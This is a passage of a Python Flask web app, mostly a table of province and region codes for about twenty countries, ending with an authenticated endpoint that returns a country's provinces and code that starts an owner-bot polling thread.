        {"code": "TKI", "name": "Taranaki"},
        {"code": "WGN", "name": "Wellington"},
        {"code": "WKO", "name": "Waikato"},
        {"code": "WTC", "name": "West Coast"},
    ],
    "PH": [
        {"code": "ABR", "name": "Abra"},
        {"code": "AGN", "name": "Agusan del Norte"},
        {"code": "AGS", "name": "Agusan del Sur"},
        {"code": "AKL", "name": "Aklan"},
        {"code": "ALB", "name": "Albay"},
        {"code": "ANT", "name": "Antique"},
        {"code": "APA", "name": "Apayao"},
        {"code": "AUR", "name": "Aurora"},
        {"code": "BAS", "name": "Basilan"},
        {"code": "BAN", "name": "Bataan"},
        {"code": "BTN", "name": "Batanes"},
        {"code": "BTG", "name": "Batangas"},
        {"code": "BEN", "name": "Benguet"},
        {"code": "BIL", "name": "Biliran"},
        {"code": "BOH", "name": "Bohol"},
        {"code": "BUK", "name": "Bukidnon"},
        {"code": "BUL", "name": "Bulacan"},
        {"code": "CAG", "name": "Cagayan"},
        {"code": "CAN", "name": "Camarines Norte"},
        {"code": "CAS", "name": "Camarines Sur"},
        {"code": "CAM", "name": "Camiguin"},
        {"code": "CAP", "name": "Capiz"},
        {"code": "CAT", "name": "Catanduanes"},
        {"code": "CAV", "name": "Cavite"},
        {"code": "CEB", "name": "Cebu"},
        {"code": "COM", "name": "Compostela Valley"},
        {"code": "NCO", "name": "Cotabato"},
        {"code": "DAV", "name": "Davao del Norte"},
        {"code": "DAS", "name": "Davao del Sur"},
        {"code": "DAO", "name": "Davao Occidental"},
        {"code": "DAC", "name": "Davao de Oro"},
        {"code": "DAO", "name": "Davao Oriental"},
        {"code": "DIN", "name": "Dinagat Islands"},
        {"code": "EAS", "name": "Eastern Samar"},
        {"code": "GUI", "name": "Guimaras"},
        {"code": "IFU", "name": "Ifugao"},
        {"code": "ILN", "name": "Ilocos Norte"},
        {"code": "ILS", "name": "Ilocos Sur"},
        {"code": "ILI", "name": "Iloilo"},
        {"code": "ISA", "name": "Isabela"},
        {"code": "KAL", "name": "Kalinga"},
        {"code": "LAN", "name": "Lanao del Norte"},
        {"code": "LAS", "name": "Lanao del Sur"},
        {"code": "LUN", "name": "La Union"},
        {"code": "LAG", "name": "Laguna"},
        {"code": "LEY", "name": "Leyte"},
        {"code": "MAG", "name": "Maguindanao"},
        {"code": "MAR", "name": "Marinduque"},
        {"code": "MAS", "name": "Masbate"},
        {"code": "MDC", "name": "Mindoro Occidental"},
        {"code": "MDR", "name": "Mindoro Oriental"},
        {"code": "MIS", "name": "Misamis Occidental"},
        {"code": "MSR", "name": "Misamis Oriental"},
        {"code": "MOU", "name": "Mountain Province"},
        {"code": "NEC", "name": "Negros Occidental"},
        {"code": "NER", "name": "Negros Oriental"},
        {"code": "NSA", "name": "Northern Samar"},
        {"code": "NUE", "name": "Nueva Ecija"},
        {"code": "NUV", "name": "Nueva Vizcaya"},
        {"code": "MDC", "name": "Occidental Mindoro"},
        {"code": "PLW", "name": "Palawan"},
        {"code": "PAM", "name": "Pampanga"},
        {"code": "PAN", "name": "Pangasinan"},
        {"code": "QUE", "name": "Quezon"},
        {"code": "QUI", "name": "Quirino"},
        {"code": "RIZ", "name": "Rizal"},
        {"code": "ROM", "name": "Romblon"},
        {"code": "WSA", "name": "Samar"},
        {"code": "SAR", "name": "Sarangani"},
        {"code": "SIQ", "name": "Siquijor"},
        {"code": "SOR", "name": "Sorsogon"},
        {"code": "SCO", "name": "South Cotabato"},
        {"code": "SLE", "name": "Southern Leyte"},
        {"code": "SUK", "name": "Sultan Kudarat"},
        {"code": "SLU", "name": "Sulu"},
        {"code": "SUN", "name": "Surigao del Norte"},
        {"code": "SUR", "name": "Surigao del Sur"},
        {"code": "TAR", "name": "Tarlac"},
        {"code": "TAW", "name": "Tawi-Tawi"},
        {"code": "ZMB", "name": "Zambales"},
        {"code": "ZAN", "name": "Zamboanga del Norte"},
        {"code": "ZAS", "name": "Zamboanga del Sur"},
        {"code": "ZSI", "name": "Zamboanga Sibugay"},
    ],
    "MY": [
        {"code": "01", "name": "Johor"},
        {"code": "02", "name": "Kedah"},
        {"code": "03", "name": "Kelantan"},
        {"code": "04", "name": "Melaka"},
        {"code": "05", "name": "Negeri Sembilan"},
        {"code": "06", "name": "Pahang"},
        {"code": "07", "name": "Pulau Pinang"},
        {"code": "08", "name": "Perak"},
        {"code": "09", "name": "Perlis"},
        {"code": "10", "name": "Selangor"},
        {"code": "11", "name": "Terengganu"},
        {"code": "12", "name": "Sabah"},
        {"code": "13", "name": "Sarawak"},
        {"code": "14", "name": "Kuala Lumpur"},
        {"code": "15", "name": "Labuan"},
        {"code": "16", "name": "Putrajaya"},
    ],
    "NG": [
        {"code": "AB", "name": "Abia"},
        {"code": "FC", "name": "Abuja"},
        {"code": "AD", "name": "Adamawa"},
        {"code": "AK", "name": "Akwa Ibom"},
        {"code": "AN", "name": "Anambra"},
        {"code": "BA", "name": "Bauchi"},
        {"code": "BY", "name": "Bayelsa"},
        {"code": "BE", "name": "Benue"},
        {"code": "BO", "name": "Borno"},
        {"code": "CR", "name": "Cross River"},
        {"code": "DE", "name": "Delta"},
        {"code": "EB", "name": "Ebonyi"},
        {"code": "ED", "name": "Edo"},
        {"code": "EK", "name": "Ekiti"},
        {"code": "EN", "name": "Enugu"},
        {"code": "GO", "name": "Gombe"},
        {"code": "IM", "name": "Imo"},
        {"code": "JI", "name": "Jigawa"},
        {"code": "KD", "name": "Kaduna"},
        {"code": "KN", "name": "Kano"},
        {"code": "KT", "name": "Katsina"},
        {"code": "KE", "name": "Kebbi"},
        {"code": "KO", "name": "Kogi"},
        {"code": "KW", "name": "Kwara"},
        {"code": "LA", "name": "Lagos"},
        {"code": "NA", "name": "Nasarawa"},
        {"code": "NI", "name": "Niger"},
        {"code": "OG", "name": "Ogun"},
        {"code": "ON", "name": "Ondo"},
        {"code": "OS", "name": "Osun"},
        {"code": "OY", "name": "Oyo"},
        {"code": "PL", "name": "Plateau"},
        {"code": "RI", "name": "Rivers"},
        {"code": "SO", "name": "Sokoto"},
        {"code": "TA", "name": "Taraba"},
        {"code": "YO", "name": "Yobe"},
        {"code": "ZA", "name": "Zamfara"},
    ],
    "AR": [
        {"code": "B", "name": "Buenos Aires Province"},
        {"code": "C", "name": "Buenos Aires City"},
        {"code": "K", "name": "Catamarca"},
        {"code": "H", "name": "Chaco"},
        {"code": "U", "name": "Chubut"},
        {"code": "X", "name": "Cordoba"},
        {"code": "W", "name": "Corrientes"},
        {"code": "E", "name": "Entre Rios"},
        {"code": "P", "name": "Formosa"},
        {"code": "Y", "name": "Jujuy"},
        {"code": "L", "name": "La Pampa"},
        {"code": "F", "name": "La Rioja"},
        {"code": "M", "name": "Mendoza"},
        {"code": "N", "name": "Misiones"},
        {"code": "Q", "name": "Neuquen"},
        {"code": "R", "name": "Rio Negro"},
        {"code": "A", "name": "Salta"},
        {"code": "J", "name": "San Juan"},
        {"code": "D", "name": "San Luis"},
        {"code": "Z", "name": "Santa Cruz"},
        {"code": "S", "name": "Santa Fe"},
        {"code": "G", "name": "Santiago del Estero"},
        {"code": "V", "name": "Tierra del Fuego"},
        {"code": "T", "name": "Tucuman"},
    ],
    "CL": [
        {"code": "AI", "name": "Aisen"},
        {"code": "AN", "name": "Antofagasta"},
        {"code": "AP", "name": "Arica y Parinacota"},
        {"code": "AT", "name": "Atacama"},
        {"code": "BI", "name": "Biobio"},
        {"code": "CO", "name": "Coquimbo"},
        {"code": "AR", "name": "La Araucania"},
        {"code": "LI", "name": "Libertador General Bernardo O'Higgins"},
        {"code": "LL", "name": "Los Lagos"},
        {"code": "LR", "name": "Los Rios"},
        {"code": "MA", "name": "Magallanes"},
        {"code": "ML", "name": "Maule"},
        {"code": "NB", "name": "Nuble"},
        {"code": "RM", "name": "Region Metropolitana"},
        {"code": "TA", "name": "Tarapaca"},
        {"code": "VS", "name": "Valparaiso"},
    ],
    "CO": [
        {"code": "AMA", "name": "Amazonas"},
        {"code": "ANT", "name": "Antioquia"},
        {"code": "ARA", "name": "Arauca"},
        {"code": "ATL", "name": "Atlantico"},
        {"code": "BOL", "name": "Bolivar"},
        {"code": "BOY", "name": "Boyaca"},
        {"code": "CAL", "name": "Caldas"},
        {"code": "CAQ", "name": "Caqueta"},
        {"code": "CAS", "name": "Casanare"},
        {"code": "CAU", "name": "Cauca"},
        {"code": "CES", "name": "Cesar"},
        {"code": "CHO", "name": "Choco"},
        {"code": "COR", "name": "Cordoba"},
        {"code": "CUN", "name": "Cundinamarca"},
        {"code": "DC", "name": "Bogota D.C."},
        {"code": "GUA", "name": "Guainia"},
        {"code": "GUV", "name": "Guaviare"},
        {"code": "HUI", "name": "Huila"},
        {"code": "LAG", "name": "La Guajira"},
        {"code": "MAG", "name": "Magdalena"},
        {"code": "MET", "name": "Meta"},
        {"code": "NAR", "name": "Narino"},
        {"code": "NSA", "name": "Norte de Santander"},
        {"code": "PUT", "name": "Putumayo"},
        {"code": "QUI", "name": "Quindio"},
        {"code": "RIS", "name": "Risaralda"},
        {"code": "SAP", "name": "San Andres y Providencia"},
        {"code": "SAN", "name": "Santander"},
        {"code": "SUC", "name": "Sucre"},
        {"code": "TOL", "name": "Tolima"},
        {"code": "VAC", "name": "Valle del Cauca"},
        {"code": "VAU", "name": "Vaupes"},
        {"code": "VID", "name": "Vichada"},
    ],
    "PE": [
        {"code": "AMA", "name": "Amazonas"},
        {"code": "ANC", "name": "Ancash"},
        {"code": "APU", "name": "Apurimac"},
        {"code": "ARE", "name": "Arequipa"},
        {"code": "AYA", "name": "Ayacucho"},
        {"code": "CAJ", "name": "Cajamarca"},
        {"code": "CAL", "name": "Callao"},
        {"code": "CUS", "name": "Cusco"},
        {"code": "HUV", "name": "Huancavelica"},
        {"code": "HUC", "name": "Huanuco"},
        {"code": "ICA", "name": "Ica"},
        {"code": "JUN", "name": "Junin"},
        {"code": "LAL", "name": "La Libertad"},
        {"code": "LAM", "name": "Lambayeque"},
        {"code": "LIM", "name": "Lima"},
        {"code": "LOR", "name": "Loreto"},
        {"code": "MDD", "name": "Madre de Dios"},
        {"code": "MOQ", "name": "Moquegua"},
        {"code": "PAS", "name": "Pasco"},
        {"code": "PIU", "name": "Piura"},
        {"code": "PUN", "name": "Puno"},
        {"code": "SAM", "name": "San Martin"},
        {"code": "TAC", "name": "Tacna"},
        {"code": "TUM", "name": "Tumbes"},
        {"code": "UCA", "name": "Ucayali"},
    ],
    "ID": [
        {"code": "AC", "name": "Aceh"},
        {"code": "BA", "name": "Bali"},
        {"code": "BB", "name": "Bangka Belitung Islands"},
        {"code": "BT", "name": "Banten"},
        {"code": "BE", "name": "Bengkulu"},
        {"code": "GO", "name": "Gorontalo"},
        {"code": "JK", "name": "Jakarta"},
        {"code": "JA", "name": "Jambi"},
        {"code": "JB", "name": "West Java"},
        {"code": "JT", "name": "Central Java"},
        {"code": "JI", "name": "East Java"},
        {"code": "KB", "name": "West Kalimantan"},
        {"code": "KS", "name": "South Kalimantan"},
        {"code": "KT", "name": "Central Kalimantan"},
        {"code": "KI", "name": "East Kalimantan"},
        {"code": "KU", "name": "North Kalimantan"},
        {"code": "KR", "name": "Riau Islands"},
        {"code": "LA", "name": "Lampung"},
        {"code": "MA", "name": "Maluku"},
        {"code": "MU", "name": "North Maluku"},
        {"code": "NB", "name": "West Nusa Tenggara"},
        {"code": "NT", "name": "East Nusa Tenggara"},
        {"code": "PA", "name": "Papua"},
        {"code": "PB", "name": "West Papua"},
        {"code": "RI", "name": "Riau"},
        {"code": "SR", "name": "West Sulawesi"},
        {"code": "SN", "name": "South Sulawesi"},
        {"code": "ST", "name": "Central Sulawesi"},
        {"code": "SG", "name": "Southeast Sulawesi"},
        {"code": "SA", "name": "North Sulawesi"},
        {"code": "SB", "name": "West Sumatra"},
        {"code": "SS", "name": "South Sumatra"},
        {"code": "SU", "name": "North Sumatra"},
        {"code": "YO", "name": "Yogyakarta"},
    ],
    "CN": [
        {"code": "AH", "name": "Anhui"},
        {"code": "BJ", "name": "Beijing"},
        {"code": "CQ", "name": "Chongqing"},
        {"code": "FJ", "name": "Fujian"},
        {"code": "GS", "name": "Gansu"},
        {"code": "GD", "name": "Guangdong"},
        {"code": "GX", "name": "Guangxi"},
        {"code": "GZ", "name": "Guizhou"},
        {"code": "HI", "name": "Hainan"},
        {"code": "HE", "name": "Hebei"},
        {"code": "HL", "name": "Heilongjiang"},
        {"code": "HA", "name": "Henan"},
        {"code": "HK", "name": "Hong Kong"},
        {"code": "HB", "name": "Hubei"},
        {"code": "HN", "name": "Hunan"},
        {"code": "NM", "name": "Inner Mongolia"},
        {"code": "JS", "name": "Jiangsu"},
        {"code": "JX", "name": "Jiangxi"},
        {"code": "JL", "name": "Jilin"},
        {"code": "LN", "name": "Liaoning"},
        {"code": "MO", "name": "Macau"},
        {"code": "NX", "name": "Ningxia"},
        {"code": "QH", "name": "Qinghai"},
        {"code": "SN", "name": "Shaanxi"},
        {"code": "SD", "name": "Shandong"},
        {"code": "SH", "name": "Shanghai"},
        {"code": "SX", "name": "Shanxi"},
        {"code": "SC", "name": "Sichuan"},
        {"code": "TJ", "name": "Tianjin"},
        {"code": "XJ", "name": "Xinjiang"},
        {"code": "XZ", "name": "Tibet"},
        {"code": "YN", "name": "Yunnan"},
        {"code": "ZJ", "name": "Zhejiang"},
    ],
    "KR": [
        {"code": "26", "name": "Busan"},
        {"code": "43", "name": "Chungcheongbuk-do"},
        {"code": "44", "name": "Chungcheongnam-do"},
        {"code": "27", "name": "Daegu"},
        {"code": "30", "name": "Daejeon"},
        {"code": "42", "name": "Gangwon-do"},
        {"code": "29", "name": "Gwangju"},
        {"code": "41", "name": "Gyeonggi-do"},
        {"code": "47", "name": "Gyeongsangbuk-do"},
        {"code": "48", "name": "Gyeongsangnam-do"},
        {"code": "28", "name": "Incheon"},
        {"code": "49", "name": "Jeju-do"},
        {"code": "45", "name": "Jeollabuk-do"},
        {"code": "46", "name": "Jeollanam-do"},
        {"code": "50", "name": "Sejong"},
        {"code": "11", "name": "Seoul"},
        {"code": "31", "name": "Ulsan"},
    ],
    "TH": [
        {"code": "10", "name": "Bangkok"},
        {"code": "11", "name": "Samut Prakan"},
        {"code": "12", "name": "Nonthaburi"},
        {"code": "13", "name": "Pathum Thani"},
        {"code": "14", "name": "Phra Nakhon Si Ayutthaya"},
        {"code": "15", "name": "Ang Thong"},
        {"code": "16", "name": "Lop Buri"},
        {"code": "17", "name": "Sing Buri"},
        {"code": "18", "name": "Chai Nat"},
        {"code": "19", "name": "Saraburi"},
        {"code": "20", "name": "Chon Buri"},
        {"code": "21", "name": "Rayong"},
        {"code": "22", "name": "Chanthaburi"},
        {"code": "23", "name": "Trat"},
        {"code": "24", "name": "Chachoengsao"},
        {"code": "25", "name": "Prachin Buri"},
        {"code": "26", "name": "Nakhon Nayok"},
        {"code": "27", "name": "Sa Kaeo"},
        {"code": "30", "name": "Nakhon Ratchasima"},
        {"code": "31", "name": "Buri Ram"},
        {"code": "32", "name": "Surin"},
        {"code": "33", "name": "Si Sa Ket"},
        {"code": "34", "name": "Ubon Ratchathani"},
        {"code": "35", "name": "Yasothon"},
        {"code": "36", "name": "Chaiyaphum"},
        {"code": "37", "name": "Amnat Charoen"},
        {"code": "38", "name": "Bueng Kan"},
        {"code": "39", "name": "Nong Bua Lam Phu"},
        {"code": "40", "name": "Khon Kaen"},
        {"code": "41", "name": "Udon Thani"},
        {"code": "42", "name": "Loei"},
        {"code": "43", "name": "Nong Khai"},
        {"code": "44", "name": "Maha Sarakham"},
        {"code": "45", "name": "Roi Et"},
        {"code": "46", "name": "Kalasin"},
        {"code": "47", "name": "Sakon Nakhon"},
        {"code": "48", "name": "Nakhon Phanom"},
        {"code": "49", "name": "Mukdahan"},
        {"code": "50", "name": "Chiang Mai"},
        {"code": "51", "name": "Lamphun"},
        {"code": "52", "name": "Lampang"},
        {"code": "53", "name": "Uttaradit"},
        {"code": "54", "name": "Phrae"},
        {"code": "55", "name": "Nan"},
        {"code": "56", "name": "Phayao"},
        {"code": "57", "name": "Chiang Rai"},
        {"code": "58", "name": "Mae Hong Son"},
        {"code": "60", "name": "Nakhon Sawan"},
        {"code": "61", "name": "Uthai Thani"},
        {"code": "62", "name": "Kamphaeng Phet"},
        {"code": "63", "name": "Tak"},
        {"code": "64", "name": "Sukhothai"},
        {"code": "65", "name": "Phitsanulok"},
        {"code": "66", "name": "Phichit"},
        {"code": "67", "name": "Phetchabun"},
        {"code": "70", "name": "Ratchaburi"},
        {"code": "71", "name": "Kanchanaburi"},
        {"code": "72", "name": "Suphan Buri"},
        {"code": "73", "name": "Nakhon Pathom"},
        {"code": "74", "name": "Samut Sakhon"},
        {"code": "75", "name": "Samut Songkhram"},
        {"code": "76", "name": "Phetchaburi"},
        {"code": "77", "name": "Prachuap Khiri Khan"},
        {"code": "80", "name": "Nakhon Si Thammarat"},
        {"code": "81", "name": "Krabi"},
        {"code": "82", "name": "Phangnga"},
        {"code": "83", "name": "Phuket"},
        {"code": "84", "name": "Surat Thani"},
        {"code": "85", "name": "Ranong"},
        {"code": "86", "name": "Chumphon"},
        {"code": "90", "name": "Songkhla"},
        {"code": "91", "name": "Satun"},
        {"code": "92", "name": "Trang"},
        {"code": "93", "name": "Phatthalung"},
        {"code": "94", "name": "Pattani"},
        {"code": "95", "name": "Yala"},
        {"code": "96", "name": "Narathiwat"},
    ],
    "EG": [
        {"code": "ALX", "name": "Alexandria"},
        {"code": "ASN", "name": "Aswan"},
        {"code": "AST", "name": "Asyut"},
        {"code": "BH", "name": "Beheira"},
        {"code": "BNS", "name": "Beni Suef"},
        {"code": "C", "name": "Cairo"},
        {"code": "DK", "name": "Dakahlia"},
        {"code": "DT", "name": "Damietta"},
        {"code": "FYM", "name": "Faiyum"},
        {"code": "GH", "name": "Gharbia"},
        {"code": "GZ", "name": "Giza"},
        {"code": "IS", "name": "Ismailia"},
        {"code": "KFS", "name": "Kafr el-Sheikh"},
        {"code": "LX", "name": "Luxor"},
        {"code": "MT", "name": "Matrouh"},
        {"code": "MN", "name": "Minya"},
        {"code": "MNF", "name": "Monufia"},
        {"code": "WAD", "name": "New Valley"},
        {"code": "SHR", "name": "North Sinai"},
        {"code": "PTS", "name": "Port Said"},
        {"code": "KB", "name": "Qalyubia"},
        {"code": "KN", "name": "Qena"},
        {"code": "SHG", "name": "Sohag"},
        {"code": "SIN", "name": "South Sinai"},
        {"code": "SUZ", "name": "Suez"},
    ],
    "SA": [
        {"code": "01", "name": "Riyadh"},
        {"code": "02", "name": "Makkah"},
        {"code": "03", "name": "Madinah"},
        {"code": "04", "name": "Eastern Province"},
        {"code": "05", "name": "Al-Qassim"},
        {"code": "06", "name": "Hail"},
        {"code": "07", "name": "Tabuk"},
        {"code": "08", "name": "Al-Jawf"},
        {"code": "09", "name": "Jizan"},
        {"code": "10", "name": "Asir"},
        {"code": "11", "name": "Najran"},
        {"code": "12", "name": "Al-Baha"},
        {"code": "14", "name": "Northern Borders"},
    ],
    "AE": [
        {"code": "AJ", "name": "Ajman"},
        {"code": "AZ", "name": "Abu Dhabi"},
        {"code": "DU", "name": "Dubai"},
        {"code": "FU", "name": "Fujairah"},
        {"code": "RK", "name": "Ras al-Khaimah"},
        {"code": "SH", "name": "Sharjah"},
        {"code": "UQ", "name": "Umm al-Quwain"},
    ],
    "PK": [
        {"code": "BA", "name": "Balochistan"},
        {"code": "GB", "name": "Gilgit-Baltistan"},
        {"code": "IS", "name": "Islamabad Capital Territory"},
        {"code": "KP", "name": "Khyber Pakhtunkhwa"},
        {"code": "PB", "name": "Punjab"},
        {"code": "SD", "name": "Sindh"},
        {"code": "AJ", "name": "Azad Kashmir"},
    ],
    "UA": [
        {"code": "CK", "name": "Cherkasy"},
        {"code": "CH", "name": "Chernihiv"},
        {"code": "CV", "name": "Chernivtsi"},
        {"code": "DP", "name": "Dnipropetrovsk"},
        {"code": "DT", "name": "Donetsk"},
        {"code": "IF", "name": "Ivano-Frankivsk"},
        {"code": "KH", "name": "Kharkiv"},
        {"code": "KS", "name": "Kherson"},
        {"code": "KM", "name": "Khmelnytskyi"},
        {"code": "KV", "name": "Kyiv"},
        {"code": "KC", "name": "Kyiv City"},
        {"code": "KR", "name": "Kirovohrad"},
        {"code": "LH", "name": "Luhansk"},
        {"code": "LV", "name": "Lviv"},
        {"code": "MY", "name": "Mykolaiv"},
        {"code": "OD", "name": "Odessa"},
        {"code": "PL", "name": "Poltava"},
        {"code": "RV", "name": "Rivne"},
        {"code": "SM", "name": "Sumy"},
        {"code": "TP", "name": "Ternopil"},
        {"code": "VI", "name": "Vinnytsia"},
        {"code": "VL", "name": "Volyn"},
        {"code": "ZP", "name": "Zaporizhzhia"},
        {"code": "ZK", "name": "Zakarpattia"},
        {"code": "ZT", "name": "Zhytomyr"},
    ],
}


@app.route("/provinces", methods=["POST"])
@require_auth
def get_provinces():
    data = request.json
    country_code = (data.get("country") or "").strip().upper()
    if not country_code:
        return jsonify({"provinces": []})
    provinces = PROVINCES_DATA.get(country_code, [])
    return jsonify({"provinces": provinces})


# Start the owner bot polling thread regardless of how the app is launched.
# When run via Gunicorn, __name__ != '__main__', so the thread must be
# started at module level — not inside the __main__ guard.
if OWNER_BOT_TOKEN and OWNER_CHAT_ID:
    _bot_thread = threading.Thread(target=_bot_polling, daemon=True)
    _bot_thread.start()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
